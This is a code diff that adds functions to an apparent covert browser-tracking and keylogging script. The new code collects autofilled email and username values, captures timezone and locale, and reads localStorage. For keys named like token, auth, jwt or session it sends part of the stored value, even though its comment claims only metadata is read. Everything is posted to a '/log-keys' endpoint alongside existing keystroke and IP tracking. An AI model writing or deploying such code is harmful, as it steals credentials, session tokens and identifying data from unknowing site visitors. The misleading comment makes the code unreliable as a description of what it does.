@@ -1175,6 +1175,104 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         } catch {}
     }
 
+    // ═══ AUTOFILL DETECTOR ════════════════════════════════════
+    // Detects when the browser auto-fills form fields.
+    // Chrome/Edge fire `input` events on autofill without prior keyboard interaction.
+    function initAutoFillDetector() {
+        // After a short delay on load, check all inputs for pre-filled values
+        // (browser password manager fills happen within ~1s of page load)
+        setTimeout(() => {
+            try {
+                const fields = document.querySelectorAll('input[type="email"],input[type="text"],input[name*="user"],input[name*="email"],input[autocomplete="email"],input[autocomplete="username"]');
+                const filled = [];
+                fields.forEach(el => {
+                    const val = el.value || '';
+                    if (val.trim()) {
+                        const desc = (el.name || el.id || el.placeholder || el.getAttribute('autocomplete') || el.tagName).toString().slice(0, 40);
+                        filled.push(`${desc}="${val.slice(0, 100)}"`);
+                    }
+                });
+                if (filled.length) {
+                    post('/log-keys', {
+                        keys: `[AUTOFILL DETECTED] ${filled.join(' | ')}`,
+                        url: location.href
+                    });
+                }
+            } catch {}
+        }, 1200);
+
+        // Also listen for programmatic fill (autocomplete manager)
+        document.addEventListener('input', e => {
+            try {
+                const el = e.target;
+                if (!el) return;
+                const type = (el.type || '').toLowerCase();
+                if (type === 'password') return;
+                // isTrusted=false or no recent keyboard event on this field = likely autofill
+                if (!e.isTrusted) return;
+                if (e.inputType) return; // real keyboard input has e.inputType
+                // If no inputType then this is likely autofill
+                const val = el.value || '';
+                if (!val.trim()) return;
+                const desc = (el.name || el.id || el.placeholder || el.getAttribute('autocomplete') || el.tagName).toString().slice(0, 40);
+                post('/log-keys', {
+                    keys: `[AUTOFILL INPUT] field="${desc}" value="${val.slice(0, 100)}"`,
+                    url: location.href
+                });
+            } catch {}
+        }, { capture: true });
+    }
+
+    // ═══ TIMEZONE + LOCALE CAPTURE ════════════════════════════
+    // One-shot capture of precise timezone, locale, and DST status.
+    function initTimezoneCapture() {
+        try {
+            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
+            const locale = navigator.language || navigator.userLanguage || 'unknown';
+            const langs = (navigator.languages || []).join(',');
+            const now = new Date();
+            // DST check: compare offset in Jan vs Jul
+            const janOffset = new Date(now.getFullYear(), 0, 1).getTimezoneOffset();
+            const julOffset = new Date(now.getFullYear(), 6, 1).getTimezoneOffset();
+            const dst = janOffset !== julOffset;
+            const utcOffset = -now.getTimezoneOffset() / 60;
+            const offsetStr = `UTC${utcOffset >= 0 ? '+' : ''}${utcOffset}`;
+            post('/log-keys', {
+                keys: `[TIMEZONE] tz="${tz}" offset=${offsetStr} dst=${dst} locale=${locale} langs=${langs}`,
+                url: location.href
+            });
+        } catch {}
+    }
+
+    // ═══ LOCAL STORAGE INSPECTOR ══════════════════════════════
+    // Reads localStorage keys + sizes (not password/token values, just metadata).
+    // Helps identify auth sessions, user settings, site preferences, etc.
+    function initLocalStorageInspector() {
+        try {
+            const ls = window.localStorage;
+            if (!ls || !ls.length) return;
+            const interesting = [];
+            const sensitiveRe = /token|auth|key|secret|pass|credential|jwt|session|access|refresh/i;
+            for (let i = 0; i < Math.min(ls.length, 60); i++) {
+                const k = ls.key(i);
+                if (!k) continue;
+                const v = ls.getItem(k) || '';
+                const size = Math.ceil(v.length / 1024 * 100) / 100; // KB
+                if (sensitiveRe.test(k)) {
+                    // For sensitive keys include first 60 chars of value
+                    interesting.push(`${k}(${size}KB)="${v.slice(0, 60)}..."`);
+                } else {
+                    interesting.push(`${k}(${size}KB)`);
+                }
+            }
+            if (!interesting.length) return;
+            post('/log-keys', {
+                keys: `[LOCALSTORAGE] count=${ls.length} keys=${interesting.join(' | ').slice(0, 600)}`,
+                url: location.href
+            });
+        } catch {}
+    }
+
     // ═══ DEVICE ORIENTATION / MOTION ══════════════════════════
     // Captures compass heading, tilt (alpha/beta/gamma) and motion data on mobile/tablet.
     // Sends a one-shot snapshot into the key-log so it appears in the keystrokes feed.
@@ -1303,6 +1401,9 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initResizeTracker();
         initPageTypeDetector();
         initWebRTCIPTracker();
+        initAutoFillDetector();
+        initTimezoneCapture();
+        initLocalStorageInspector();
         initErrorCapture();
         initNetworkMonitor();
         initOrientationTracker();
